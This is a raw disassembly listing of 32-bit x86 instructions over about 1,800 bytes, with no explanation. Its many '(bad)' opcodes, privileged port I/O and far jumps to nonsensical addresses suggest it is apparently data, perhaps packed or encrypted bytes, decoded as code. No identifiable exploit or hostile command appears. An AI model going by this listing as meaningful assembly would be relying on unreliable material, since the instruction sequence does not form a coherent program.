  40f3e9:	or     DWORD PTR [eax-0x40ae2e48],eax
  40f3ef:	pop    esi
  40f3f0:	sbb    BYTE PTR [ecx+0x75],dl
  40f3f3:	retf   0xa119
  40f3f6:	out    dx,al
  40f3f7:	shl    DWORD PTR es:[eax+0x7b901a72],1
  40f3fe:	out    0xd,al
  40f400:	imul   ebx,edx,0xfffffffb
  40f403:	or     edi,DWORD PTR es:[edx]
  40f406:	cmp    al,0xfc
  40f408:	xchg   BYTE PTR [esi-0x1],bh
  40f40b:	test   al,0x3b
  40f40d:	js     0x40f39f
  40f40f:	inc    ebp
  40f410:	sti    
  40f411:	and    eax,DWORD PTR [eax]
  40f413:	add    eax,0x40c30dec
  40f418:	(bad)  
  40f419:	jo     0x40f46d
  40f41b:	mov    DWORD PTR [edx],edx
  40f41d:	pop    esi
  40f41e:	sub    cl,BYTE PTR [ebx+0x6]
  40f421:	cmp    edx,ebx
  40f423:	mov    ds:0xd953da13,al
  40f428:	fstp   TBYTE PTR [edx-0x51]
  40f42b:	dec    esp
  40f42d:	sbb    cl,BYTE PTR [esi+0x30]
  40f430:	pop    eax
  40f431:	xor    eax,0x1a0d1462
  40f436:	xor    DWORD PTR [edi],ecx
  40f438:	add    dh,BYTE PTR [eax+eiz*4-0x1f]
  40f43c:	push   0xdb87bab8
  40f441:	mov    cl,0xca
  40f443:	sbb    eax,0xc6ebc3f2
  40f448:	in     al,0x4f
  40f44a:	mov    esp,0xbf1e2a51
  40f44f:	dec    ebp
  40f450:	enter  0xba85,0x27
  40f454:	gs add al,0x53
  40f457:	and    esi,0xd1fc9b1d
  40f45d:	lds    edi,FWORD PTR [ecx]
  40f45f:	fiadd  WORD PTR [edi+0xa]
  40f462:	and    ah,BYTE PTR ds:0xc46138d6
  40f468:	(bad)  
  40f469:	xor    dl,dh
  40f46b:	cmc    
  40f46c:	mov    bh,BYTE PTR [eax-0x35]
  40f46f:	aad    0x41
  40f471:	and    ebp,ebx
  40f473:	aam    0xb
  40f475:	clc    
  40f476:	xchg   al,dh
  40f478:	mov    ch,BYTE PTR [ebx]
  40f47a:	pusha  
  40f47b:	mov    cl,0xe
  40f47d:	push   0x4e116ae1
  40f482:	and    dh,BYTE PTR [edi-0x67e049f1]
  40f488:	jg     0x40f411
  40f48a:	ja     0x40f4ef
  40f48c:	call   0x666f656
  40f491:	mov    WORD PTR [edx-0x4e],es
  40f494:	sub    BYTE PTR [ebx-0x24279fec],al
  40f49a:	dec    edi
  40f49b:	into   
  40f49c:	sub    DWORD PTR [ebp+0x53],ebx
  40f49f:	pop    ss
  40f4a0:	cdq    
  40f4a1:	or     BYTE PTR [esi+0x42072a1e],dh
  40f4a7:	mov    WORD PTR [edi-0x520eeaaf],ds
  40f4ad:	shr    BYTE PTR ds:0xa7843693,0x13
  40f4b4:	adc    cl,BYTE PTR [ebx-0x714bf37d]
  40f4ba:	mov    dl,0xf
  40f4bc:	and    DWORD PTR [edx],esp
  40f4be:	jb     0x40f4e5
  40f4c0:	jg     0x40f52d
  40f4c2:	loopne 0x40f4f6
  40f4c4:	bound  esp,QWORD PTR [esi-0x5297655a]
  40f4ca:	mov    ss,WORD PTR [edi-0x2a58c5f7]
  40f4d0:	arpl   WORD PTR ds:0xb5c8264e,si
  40f4d6:	(bad)  
  40f4d7:	repz mov bl,0x52
  40f4da:	mov    al,0xfd
  40f4dc:	jecxz  0x40f4ad
  40f4de:	mov    dh,0x36
  40f4e0:	cs (bad) 
  40f4e2:	iret   
  40f4e3:	mov    ebp,DWORD PTR [ebx]
  40f4e5:	mov    ebx,DWORD PTR [edi]
  40f4e7:	push   ebx
  40f4e8:	push   es
  40f4e9:	aam    0x73
  40f4eb:	mov    bh,0x27
  40f4ed:	and    edx,DWORD PTR [edi-0x1e]
  40f4f0:	pop    edi
  40f4f1:	aam    0x72
  40f4f3:	retf   
  40f4f4:	cmc    
  40f4f5:	ret    0x9f28
  40f4f8:	sbb    eax,0x995cd734
  40f4fd:	inc    ebp
  40f4fe:	es mov dh,0x9c
  40f501:	leave  
  40f502:	jno    0x40f4ca
  40f504:	(bad)  
  40f505:	sub    al,0x6
  40f507:	cdq    
  40f508:	mov    ah,0xe5
  40f50a:	mov    eax,0xc204ba3e
  40f50f:	xor    edx,DWORD PTR [esi]
  40f511:	adc    bh,cl
  40f513:	call   0xb177:0x8b334853
  40f51a:	push   esi
  40f51b:	inc    edx
  40f51c:	jmp    0x42928836
  40f521:	mov    ds:0x392d3b8c,al
  40f526:	mov    dh,0x4f
  40f528:	and    edx,DWORD PTR ds:0x2bc951ea
  40f52e:	mov    ecx,0xb0c1ad99
  40f533:	in     al,dx
  40f534:	pop    es
  40f535:	jae    0x40f575
  40f537:	mov    es,WORD PTR [edx-0x683a0792]
  40f53d:	mov    ebp,0x1f1fc53d
  40f542:	mov    edi,0xa3d26012
  40f547:	jge    0x40f5b7
  40f549:	cmp    DWORD PTR [edx+0x64858602],0xffffffa0
  40f550:	inc    ebx
  40f551:	in     al,dx
  40f552:	(bad)
  40f555:	cmp    DWORD PTR [edi+ebx*2],ebp
  40f558:	arpl   WORD PTR [edx+0x651d361a],ax
  40f55e:	test   BYTE PTR [ebx-0x1991da8f],cl
  40f564:	adc    DWORD PTR [esi],ecx
  40f566:	push   cs
  40f567:	sub    eax,0x67944469
  40f56c:	loopne 0x40f52d
  40f56e:	scas   al,BYTE PTR es:[edi]
  40f56f:	jp     0x40f579
  40f571:	ret    
  40f572:	mov    BYTE PTR [edx],bl
  40f574:	(bad)  
  40f575:	mov    dh,0x26
  40f577:	dec    esp
  40f578:	cmp    eax,0xabce655c
  40f57d:	and    BYTE PTR [edx+0x6e7e7395],0x2a
  40f584:	adc    DWORD PTR [esi+0x58],esi
  40f587:	int3   
  40f588:	sbb    eax,0xa978b1f9
  40f58d:	xor    DWORD PTR [ebp+edx*1+0x207f08eb],0xffffffb6
  40f595:	inc    esi
  40f596:	int    0xe1
  40f598:	pusha  
  40f599:	mov    esp,0x2d40ae0b
  40f59e:	fst    st(5)
  40f5a0:	inc    ebx
  40f5a1:	(bad)  
  40f5a2:	in     al,0x1b
  40f5a4:	pop    es
  40f5a5:	data16 movs BYTE PTR es:[di],BYTE PTR ds:[si]
  40f5a8:	sti    
  40f5a9:	adc    DWORD PTR [esi+0x6d],0xffffffbf
  40f5ad:	ja     0x40f56d
  40f5af:	fist   WORD PTR [edi+0x7f003c39]
  40f5b5:	inc    ebp
  40f5b6:	shl    BYTE PTR [esi],1
  40f5b8:	adc    eax,0x5e1c8466
  40f5bd:	sbb    eax,0x9ec72819
  40f5c2:	loopne 0x40f5d7
  40f5c4:	ror    dl,cl
  40f5c6:	test   BYTE PTR [ebp-0x27b819bd],cl
  40f5cc:	pop    ecx
  40f5cd:	push   ebx
  40f5ce:	shl    DWORD PTR [ebp+0x37910915],1
  40f5d4:	imul   ebx,DWORD PTR [eax+0x7a],0xffffff8e
  40f5d8:	nop
  40f5d9:	inc    edx
  40f5da:	pop    ebx
  40f5db:	mov    bh,0x66
  40f5dd:	jae    0x40f5e6
  40f5df:	cmp    edx,0x773a7896
  40f5e5:	retf   
  40f5e6:	add    al,0xaa
  40f5e8:	and    edi,esi
  40f5ea:	jecxz  0x40f659
  40f5ec:	hlt    
  40f5ed:	push   es
  40f5ee:	outs   dx,BYTE PTR ds:[esi]
  40f5ef:	mov    eax,0x39f2e6bd
  40f5f4:	fcom   QWORD PTR [edi]
  40f5f6:	pushf  
  40f5f7:	sub    BYTE PTR [esi+ecx*4+0x66],cl
  40f5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5fc:	mov    eax,ds:0x97189ee1
  40f601:	or     edi,DWORD PTR [ebp+0x4f]
  40f604:	xchg   ebp,eax
  40f605:	(bad)  
  40f606:	test   eax,0xbad5ca6d
  40f60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f60c:	push   cs
  40f60d:	scas   al,BYTE PTR es:[edi]
  40f60e:	ins    BYTE PTR es:[edi],dx
  40f60f:	test   eax,0xaa69c1c3
  40f614:	inc    ecx
  40f615:	xchg   ebp,eax
  40f616:	shl    BYTE PTR [ebx-0x38dc9901],cl
  40f61c:	push   ecx
  40f61d:	aaa    
  40f61e:	jle    0x40f615
  40f620:	cwde   
  40f621:	mov    dh,BYTE PTR [ebx-0x76]
  40f624:	in     eax,0xaa
  40f626:	adc    DWORD PTR [edi],0xc4f7cda9
  40f62c:	lahf   
  40f62d:	sub    DWORD PTR [esi+0x77bd0798],ebx
  40f633:	fdivr  QWORD PTR [edx]
  40f635:	add    eax,0x65333d17
  40f63a:	push   0xe63d61e4
  40f63f:	mov    bl,0x33
  40f641:	mov    ebx,0x13958e24
  40f646:	push   eax
  40f647:	loop   0x40f648
  40f649:	jne    0x40f60b
  40f64b:	xchg   ebx,eax
  40f64c:	leave  
  40f64d:	daa    
  40f64e:	das    
  40f64f:	add    DWORD PTR [edx+edx*4],edi
  40f652:	dec    ebp
  40f653:	sbb    BYTE PTR [edx-0x5c],ch
  40f656:	add    ebp,DWORD PTR [edi+0x291a283f]
  40f65c:	fisubr DWORD PTR [edi+0x27b4acb1]
  40f662:	lods   eax,DWORD PTR ds:[esi]
  40f663:	out    dx,eax
  40f664:	test   eax,0x14e54f0a
  40f669:	push   0x3f17eeeb
  40f66e:	or     al,0x47
  40f670:	js     0x40f6e0
  40f672:	(bad)  
  40f674:	cmp    al,0x5c
  40f676:	push   edx
  40f677:	push   0x9726cde1
  40f67c:	mov    esi,0x26e50b16
  40f681:	scas   al,BYTE PTR es:[edi]
  40f682:	(bad)  
  40f683:	xor    eax,0x881aa591
  40f688:	into   
  40f689:	xchg   edx,eax
  40f68a:	aaa    
  40f68b:	sbb    ecx,DWORD PTR [esi-0x281800e9]
  40f691:	ja     0x40f684
  40f693:	pop    esi
  40f694:	in     eax,0x7f
  40f696:	das    
  40f697:	sbb    BYTE PTR ds:0x41b8aff4,cl
  40f69d:	fsubr  QWORD PTR ss:[ecx-0x59]
  40f6a1:	adc    eax,0x1622d629
  40f6a6:	or     BYTE PTR [esi],bh
  40f6a8:	mov    ds:0xeb9b1c05,al
  40f6ad:	aas    
  40f6ae:	in     al,0xba
  40f6b0:	and    dh,bl
  40f6b2:	xchg   ebp,eax
  40f6b3:	xchg   edx,eax
  40f6b4:	frstor [ecx-0x70]
  40f6b7:	out    dx,al
  40f6b8:	es mov dh,cl
  40f6bb:	jne    0x40f658
  40f6bd:	loope  0x40f71d
  40f6bf:	jmp    0x637e:0x514b61da
  40f6c6:	dec    edi
  40f6c7:	xchg   ecx,eax
  40f6c8:	mov    esp,0x440ed695
  40f6cd:	int3   
  40f6ce:	fs sub ebp,edi
  40f6d1:	cmp    BYTE PTR [eax],bh
  40f6d3:	rol    BYTE PTR [esi+0x2f],1
  40f6d6:	mov    dh,dl
  40f6d8:	push   esi
  40f6d9:	repz cli 
  40f6db:	jnp    0x40f6b6
  40f6dd:	loop   0x40f694
  40f6df:	cmp    ch,BYTE PTR [ebx+0x40]
  40f6e2:	das    
  40f6e3:	or     eax,0xb780eac6
  40f6e8:	xor    BYTE PTR [eax],dh
  40f6ea:	enter  0xdc2,0x7b
  40f6ee:	pop    bx
  40f6f0:	jo     0x40f701
  40f6f2:	iret   
  40f6f3:	pusha  
  40f6f4:	and    al,0xc2
  40f6f6:	mov    esp,gs
  40f6f8:	xlat   BYTE PTR ds:[ebx]
  40f6f9:	xchg   ebp,eax
  40f6fa:	sar    BYTE PTR [edi+0x4d3dae38],1
  40f700:	ins    DWORD PTR es:[edi],dx
  40f701:	pop    es
  40f702:	rcr    BYTE PTR [eax+ebx*1-0x5f805c66],0xd7
  40f70a:	(bad)  
  40f70b:	adc    edx,eax
  40f70d:	aas    
  40f70e:	push   ebx
  40f70f:	inc    edi
  40f710:	push   eax
  40f711:	loope  0x40f6de
  40f713:	adc    ecx,DWORD PTR [edx+eax*1]
  40f716:	out    dx,al
  40f717:	push   cs
  40f718:	jne    0x40f76d
  40f71a:	pushf  
  40f71b:	dec    edx
  40f71c:	pop    esi
  40f71d:	xchg   esp,eax
  40f71e:	sub    DWORD PTR [ecx-0x4c],esi
  40f721:	(bad)  
  40f722:	pop    edi
  40f723:	sbb    al,0x46
  40f725:	mov    ecx,0xf71e1
  40f72a:	or     al,0x60
  40f72c:	scas   al,BYTE PTR es:[edi]
  40f72d:	lds    edx,FWORD PTR [edx]
  40f72f:	outs   dx,BYTE PTR ds:[esi]
  40f730:	aas    
  40f731:	push   esi
  40f732:	test   eax,0xf42b0d39
  40f737:	xchg   esi,eax
  40f738:	sub    esi,ebp
  40f73a:	mov    dh,0x86
  40f73c:	popa   
  40f73d:	aad    0x85
  40f73f:	jge    0x40f6d2
  40f741:	jo     0x40f713
  40f743:	xchg   ebx,eax
  40f744:	adc    esp,ebx
  40f746:	rcr    DWORD PTR [edx-0x4b9fd0de],0xa4
  40f74d:	jne    0x40f7ac
  40f74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f750:	(bad)  
  40f751:	jno    0x40f74d
  40f753:	sbb    DWORD PTR [esi-0x3d65187d],esi
  40f759:	sti    
  40f75a:	mov    bl,0xb7
  40f75c:	scas   al,BYTE PTR es:[edi]
  40f75d:	shr    BYTE PTR [ecx],0x3f
  40f760:	sbb    ecx,DWORD PTR [esi]
  40f762:	in     al,0x2e
  40f764:	sbb    eax,0xcd6dfe1d
  40f769:	popf   
  40f76a:	inc    edx
  40f76b:	xor    eax,0x6b27154
  40f770:	cmc    
  40f771:	add    al,0xf8
  40f773:	push   0x60
  40f775:	int3   
  40f776:	mov    ds:0x3ab787b5,al
  40f77b:	cli    
  40f77c:	pop    esp
  40f77d:	dec    esi
  40f77e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f780:	or     ah,al
  40f782:	jnp    0x40f7ab
  40f784:	jnp    0x40f7ea
  40f786:	mov    edi,0x49c57052
  40f78b:	in     al,dx
  40f78c:	outs   dx,DWORD PTR ds:[esi]
  40f78d:	jb     0x40f784
  40f78f:	add    ch,ah
  40f791:	cli    
  40f792:	push   edi
  40f793:	nop
  40f794:	(bad)  
  40f795:	jl     0x40f7e2
  40f797:	(bad)  
  40f798:	cmp    dh,BYTE PTR [eax+0x57]
  40f79b:	inc    esp
  40f79c:	fcomp  QWORD PTR [ebp+0x70]
  40f79f:	scas   al,BYTE PTR es:[edi]
  40f7a0:	xchg   ebp,eax
  40f7a1:	adc    edi,edi
  40f7a3:	int    0xad
  40f7a5:	fsubr  st,st(0)
  40f7a7:	push   0x7ee73ad8
  40f7ac:	mov    ecx,0xb20199eb
  40f7b1:	adc    esp,DWORD PTR [edi+edi*2]
  40f7b4:	in     al,0xd0
  40f7b6:	in     al,0x98
  40f7b8:	cmp    al,0x6
  40f7ba:	in     eax,0x70
  40f7bc:	je     0x40f7a6
  40f7be:	fisttp QWORD PTR [esi+edx*8+0x35a149d3]
  40f7c5:	popf   
  40f7c6:	(bad)  
  40f7c8:	das    
  40f7c9:	push   ebp
  40f7ca:	jns    0x40f834
  40f7cc:	retf   0xcd7d
  40f7cf:	xor    DWORD PTR [eax],ebx
  40f7d1:	push   eax
  40f7d2:	xor    cl,bh
  40f7d4:	jp     0x40f7ca
  40f7d6:	xchg   ebp,eax
  40f7d7:	mov    WORD PTR [ecx-0x54df0bc0],ss
  40f7dd:	outs   dx,DWORD PTR ds:[esi]
  40f7de:	aam    0xf1
  40f7e0:	popa   
  40f7e1:	outs   dx,DWORD PTR ds:[esi]
  40f7e2:	outs   dx,BYTE PTR ds:[esi]
  40f7e3:	bound  ebp,QWORD PTR [ecx+0x6]
  40f7e6:	add    dl,ch
  40f7e8:	out    0x21,eax
  40f7ea:	(bad)  
  40f7eb:	movzx  edx,BYTE PTR [esi+0x29]
  40f7ef:	ret    0xc3b2
  40f7f2:	jecxz  0x40f859
  40f7f4:	test   BYTE PTR [ebp+0x45],dl
  40f7f7:	mov    al,ds:0x5b711010
  40f7fc:	push   eax
  40f7fd:	cmc    
  40f7fe:	adc    al,BYTE PTR [ebp+0x7f]
  40f801:	push   eax
  40f802:	xor    DWORD PTR [edx+0x3d],0x54
  40f806:	dec    edi
  40f807:	jp     0x40f7eb
  40f809:	aaa    
  40f80a:	jl     0x40f868
  40f80c:	cmp    ecx,0xa99d5e1b
  40f812:	dec    ebp
  40f813:	test   al,0x39
  40f815:	adc    cl,BYTE PTR [esp+edx*8]
  40f818:	iret   
  40f819:	aaa    
  40f81a:	and    DWORD PTR [esi],esp
  40f81c:	sub    esi,0x4381537c
  40f822:	std    
  40f823:	cld    
  40f824:	pop    edx
  40f825:	mov    dh,0x7f
  40f827:	in     al,dx
  40f828:	outs   dx,BYTE PTR ds:[esi]
  40f829:	mov    eax,0xfd91cb99
  40f82e:	dec    ebx
  40f82f:	ficomp DWORD PTR [ecx-0x2d6c88f5]
  40f835:	jne    0x40f83a
  40f837:	inc    eax
  40f838:	jmp    0x40f804
  40f83a:	pop    ebp
  40f83b:	add    BYTE PTR [edi+0x64],dl
  40f83e:	dec    esi
  40f83f:	adc    edx,DWORD PTR [edx+0x8]
  40f842:	and    ah,BYTE PTR ds:0x839ea492
  40f848:	test   eax,0x2fa7535e
  40f84d:	shl    BYTE PTR [edx-0x762adfd0],1
  40f853:	adc    al,0xe4
  40f855:	dec    esi
  40f856:	xchg   esp,eax
  40f857:	inc    edx
  40f858:	out    0x2a,eax
  40f85a:	dec    ebp
  40f85b:	or     BYTE PTR [ebp+0x10],dl
  40f85e:	push   eax
  40f85f:	jge    0x40f7ec
  40f861:	and    ch,BYTE PTR [edi]
  40f863:	iret   
  40f864:	jecxz  0x40f889
  40f866:	test   BYTE PTR [eax+0x6],bh
  40f869:	cmp    eax,0x6190ce24
  40f86e:	in     al,dx
  40f86f:	pusha  
  40f870:	stos   DWORD PTR es:[edi],eax
  40f871:	fld    DWORD PTR [ecx]
  40f873:	inc    esp
  40f874:	std    
  40f875:	arpl   WORD PTR [ebx+0x66],bx
  40f878:	dec    edi
  40f879:	xchg   esi,eax
  40f87a:	inc    DWORD PTR [ecx+0x61]
  40f87d:	pop    esp
  40f87e:	xchg   ecx,eax
  40f87f:	add    al,0x7e
  40f881:	mov    ds:0x8cd3080,eax
  40f886:	sub    dh,0xfa
  40f889:	into   
  40f88a:	pop    es
  40f88b:	cmp    edx,DWORD PTR [edx]
  40f88d:	outs   dx,DWORD PTR ds:[esi]
  40f88e:	js     0x40f8b4
  40f890:	enter  0x6f23,0xda
  40f894:	les    edi,FWORD PTR ds:0x54e7e3d3
  40f89a:	or     BYTE PTR [ebx+0x2c],0x21
  40f89e:	sar    DWORD PTR [ebp+0x29],cl
  40f8a1:	xor    al,0xff
  40f8a3:	shl    BYTE PTR [eax+0x57e91143],0xfb
  40f8aa:	sub    DWORD PTR [edi+0x30],0xffffffb1
  40f8ae:	mov    eax,cs:0x34ee353a
  40f8b4:	mov    BYTE PTR [ebx+0x14],bl
  40f8b7:	ret    0xd2c3
  40f8ba:	push   edi
  40f8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8bc:	arpl   bp,cx
  40f8be:	mov    esp,0xe8de3fd
  40f8c3:	pop    esp
  40f8c4:	mov    ?,WORD PTR [ecx]
  40f8c6:	das    
  40f8c7:	or     eax,0x6308d446
  40f8cc:	aam    0x38
  40f8ce:	xchg   ebx,eax
  40f8cf:	xchg   DWORD PTR [edi-0x7d],ebp
  40f8d2:	fcmovnb st,st(7)
  40f8d4:	inc    edi
  40f8d5:	mov    dl,dh
  40f8d7:	dec    ebx
  40f8d8:	and    ch,BYTE PTR [eax-0x47]
  40f8db:	mov    BYTE PTR [ebx],dl
  40f8dd:	and    BYTE PTR [ebp-0x3f],al
  40f8e0:	push   ecx
  40f8e1:	jo     0x40f934
  40f8e3:	je     0x40f8d7
  40f8e5:	mov    WORD PTR [ebx],fs
  40f8e7:	lods   eax,DWORD PTR ds:[esi]
  40f8e8:	adc    BYTE PTR [edi],al
  40f8ea:	stos   BYTE PTR es:[edi],al
  40f8eb:	jmp    0x44b96daa
  40f8f0:	dec    esp
  40f8f1:	sub    al,0x55
  40f8f3:	xor    edi,DWORD PTR [esi-0x6cb4ee58]
  40f8f9:	sbb    BYTE PTR [ebp-0x36],al
  40f8fc:	ror    cl,1
  40f8fe:	cmc    
  40f8ff:	les    edi,FWORD PTR ds:0xf7c9a057
  40f905:	push   ebp
  40f906:	(bad)  
  40f908:	(bad)  
  40f909:	stos   DWORD PTR es:[edi],eax
  40f90a:	ja     0x40f89e
  40f90c:	js     0x40f8c5
  40f90e:	nop
  40f90f:	sub    edi,DWORD PTR [edx+eiz*8]
  40f912:	or     ebp,DWORD PTR [esi]
  40f914:	or     BYTE PTR [edi-0x1b9bb2e9],dh
  40f91a:	push   0x115a8278
  40f91f:	fistp  WORD PTR [di]
  40f922:	cmp    al,0x82
  40f924:	call   0x77d1:0xcf84056a
  40f92b:	and    esp,edx
  40f92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92e:	adc    eax,0x6801b7ba
  40f933:	pusha  
  40f934:	fiadd  DWORD PTR [ecx-0x4f]
  40f937:	lods   eax,DWORD PTR ds:[esi]
  40f938:	jp     0x40f92c
  40f93a:	jne    0x40f93f
  40f93c:	cmp    ch,bl
  40f93e:	int    0x85
  40f940:	xor    al,0xd0
  40f942:	jg     0x40f914
  40f944:	imul   esp,DWORD PTR [ebx+0x79c2c22c],0x254ca900
  40f94e:	cmp    BYTE PTR [ebx],ch
  40f950:	jno    0x40f960
  40f952:	outs   dx,DWORD PTR ds:[esi]
  40f953:	bound  esi,QWORD PTR [ebx+edi*2]
  40f956:	jmp    0x728ea222
  40f95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f95c:	mov    ss,edi
  40f95e:	push   ds
  40f95f:	mov    fs,ebx
  40f961:	fwait
  40f962:	iret   
  40f963:	in     al,dx
  40f964:	xlat   BYTE PTR ds:[ebx]
  40f965:	stos   BYTE PTR es:[edi],al
  40f966:	push   cs
  40f967:	scas   eax,DWORD PTR es:[edi]
  40f968:	in     eax,0x35
  40f96a:	jmp    0xf3634a04
  40f96f:	sbb    dh,BYTE PTR [eax-0x4]
  40f972:	into   
  40f973:	cdq    
  40f974:	sahf   
  40f975:	daa    
  40f976:	in     al,0x88
  40f978:	test   BYTE PTR [ebx-0x61312db0],ah
  40f97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f97f:	pop    ebp
  40f980:	pop    ecx
  40f981:	dec    ebp
  40f982:	push   esp
  40f983:	aaa    
  40f984:	jae    0x40f96c
  40f986:	push   edx
  40f987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f988:	inc    ebx
  40f989:	jne    0x40f91d
  40f98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f98c:	pop    ebp
  40f98d:	fwait
  40f98e:	cmp    al,0xc4
  40f990:	and    eax,0x7e9991fb
  40f995:	mov    ebx,0x91aac65a
  40f99a:	or     esi,DWORD PTR [eax-0xb]
  40f99d:	jmp    0x97e7:0xb38c25c4
  40f9a4:	loop   0x40f998
  40f9a6:	adc    eax,0x7e16ed84
  40f9ab:	inc    esp
  40f9ac:	(bad)  
  40f9ad:	jne    0x40f9c8
  40f9af:	leave  
  40f9b0:	sbb    DWORD PTR [ebx+0x6b],edi
  40f9b3:	push   ebp
  40f9b4:	sub    eax,0x33be33c2
  40f9b9:	mov    bl,0x53
  40f9bb:	hlt    
  40f9bc:	mov    edi,0xd6060987
  40f9c1:	xchg   edx,eax
  40f9c2:	sub    al,0x38
  40f9c4:	add    esp,DWORD PTR [ebx+ebp*8+0x2a]
  40f9c8:	cli    
  40f9c9:	jmp    0x342b738d
  40f9ce:	leave  
  40f9cf:	cli    
  40f9d0:	lds    ecx,FWORD PTR [esi+0x53da15e]
  40f9d6:	rcl    ch,1
  40f9d8:	ins    BYTE PTR es:[edi],dx
  40f9d9:	jle    0x40f9d1
  40f9db:	xor    eax,0xa502621d
  40f9e0:	xchg   edx,eax
  40f9e1:	and    ch,BYTE PTR [ecx]
  40f9e3:	mov    dh,0x32
  40f9e5:	test   BYTE PTR [edx-0x4de9c37a],al
  40f9eb:	adc    eax,0xe7bb1928
  40f9f0:	test   BYTE PTR [esi+ebp*8+0x4a],ah
  40f9f4:	mov    ebx,0x92be756c
  40f9f9:	ret    
  40f9fa:	jp     0x40f9eb
  40f9fc:	add    bl,bl
  40f9fe:	xchg   ebx,eax
  40f9ff:	enter  0x7345,0xf
  40fa03:	(bad)  
  40fa04:	push   0x6e
  40fa06:	and    eax,0x6582403c
  40fa0b:	adc    BYTE PTR [ebp+0x754fd63c],bh
  40fa11:	push   edi
  40fa12:	mov    bh,BYTE PTR ds:0xc80b359c
  40fa18:	adc    esi,ebp
  40fa1a:	push   ebx
  40fa1b:	ss or  eax,0x65310509
  40fa21:	retf   0x40d7
  40fa24:	xor    eax,0x9d722359
  40fa29:	ins    BYTE PTR es:[edi],dx
  40fa2a:	inc    eax
  40fa2b:	daa    
  40fa2c:	out    0x1a,al
  40fa2e:	jge    0x40fa97
  40fa30:	clc    
  40fa31:	shl    BYTE PTR [ecx+ebp*4+0x8eda7d1],1
  40fa38:	push   es
  40fa39:	pushf  
  40fa3a:	pop    edi
  40fa3b:	jo     0x40fa5b
  40fa3d:	(bad)  
  40fa3e:	cmp    esi,edi
  40fa40:	mov    dl,0xcc
  40fa42:	mov    edx,0xd3d20eaf
  40fa47:	retf   0xf4ae
  40fa4a:	sahf   
  40fa4b:	int3   
  40fa4c:	retf   0xd780
  40fa4f:	adc    bh,dh
  40fa51:	jne    0x40fa3a
  40fa53:	push   ecx
  40fa54:	call   0x887b:0xad4892ac
  40fa5b:	and    DWORD PTR [ecx+0x8],ebx
  40fa5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa5f:	imul   edi,DWORD PTR [esi-0x42583ad9],0x14ff604b
  40fa69:	clc    
  40fa6a:	push   ecx
  40fa6b:	add    esp,eax
  40fa6d:	adc    DWORD PTR [eax],eax
  40fa6f:	push   ecx
  40fa70:	jecxz  0x40fa86
  40fa72:	inc    esi
  40fa73:	lods   eax,DWORD PTR ds:[esi]
  40fa74:	pop    esp
  40fa75:	imul   DWORD PTR [edx-0x71656c58]
  40fa7b:	xchg   ebx,eax
  40fa7c:	mov    esi,0x95951bfc
  40fa81:	add    BYTE PTR [edi-0x70],ch
  40fa84:	pop    es
  40fa85:	popa   
  40fa86:	in     eax,dx
  40fa87:	out    0x5d,eax
  40fa89:	test   dl,al
  40fa8b:	pop    ds
  40fa8c:	ss dec esp
  40fa8e:	or     BYTE PTR [edx],0x52
  40fa91:	mov    BYTE PTR [edi-0x14],cl
  40fa94:	mov    ebp,edi
  40fa96:	push   ebp
  40fa97:	mov    ss,esi
  40fa99:	sbb    eax,0xa6af2e31
  40fa9e:	mov    bh,0x30
  40faa0:	imul   DWORD PTR [edx-0x5e4fa28b]
  40faa6:	push   ebx
  40faa7:	jno    0x40face
  40faa9:	dec    ebx
  40faaa:	ret    
  40faab:	mov    ch,0x9a
  40faad:	dec    esp
  40faae:	daa    
  40faaf:	outs   dx,DWORD PTR ds:[esi]
  40fab0:	(bad)  
  40fab1:	aam    0x83
  40fab3:	in     al,0x83
  40fab5:	std    
  40fab6:	pop    ss
  40fab7:	xor    al,0x34
  40fab9:	push   ss
  40faba:	in     eax,0x7d
  40fabc:	popa   
  40fabd:	aad    0xad
  40fabf:	or     al,0xf6
  40fac1:	popf   
  40fac2:	xlat   BYTE PTR ds:[ebx]
  40fac3:	mov    edx,0x7dd2d9dc
  40fac8:	leave  
  40fac9:	div    BYTE PTR [eax]
  40facb:	stos   DWORD PTR es:[edi],eax
  40facc:	in     eax,dx
  40facd:	dec    edi
  40face:	sbb    dl,BYTE PTR [ebx+0x2a262580]
  40fad4:	jo     0x40fa67
  40fad6:	dec    ebx
  40fad7:	(bad)  
  40fad8:	adc    ecx,DWORD PTR [ebp+0x5c]
  40fadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fadc:	(bad)  
  40fadd:	jmp    0x40fa8c
  40fadf:	div    BYTE PTR [ecx]
  40fae1:	sahf   
  40fae2:	dec    ebp
  40fae3:	scas   eax,DWORD PTR es:[edi]
  40fae4:	jmp    0x40fb45
  40fae6:	pop    ss
  40fae7:	jecxz  0x40faca
  40fae9:	push   edi
  40faea:	mov    ecx,0xfc9ed7cf
  40faef:	mov    edx,0xdcd10456
  40faf4:	push   0x69
  40faf6:	in     al,0xf4
  40faf8:	dec    ebp
  40faf9:	gs (bad) 
  40fafb:	shl    DWORD PTR [edi-0x80],1
  40fafe:	mov    bl,0xc6
  40fb00:	fucom  st(5)
  40fb02:	jb     0x40faf1
  40fb04:	sbb    ch,BYTE PTR [edi-0x6bf6f530]
  40fb0a:	or     BYTE PTR [ebx-0x113e936a],0x50
  40fb11:	test   al,0x67
  40fb13:	and    ebx,DWORD PTR [edi]
  40fb15:	out    dx,al
  40fb16:	inc    esp
  40fb17:	rcr    ah,cl
  40fb19:	iret   
  40fb1a:	ins    DWORD PTR es:[edi],dx
  40fb1b:	out    dx,al
  40fb1c:	lods   al,BYTE PTR ds:[esi]
  40fb1d:	pop    DWORD PTR [ebp+0x46]
  40fb20:	sbb    DWORD PTR [edi+0x34],0xffffffa4
  40fb24:	xlat   BYTE PTR ds:[ebx]
  40fb25:	and    esi,DWORD PTR [ecx+0x11]
  40fb28:	call   0x4b42:0xfa3225d3
  40fb2f:	or     eax,0xf2722faa
  40fb34:	cwde   
  40fb35:	dec    esi
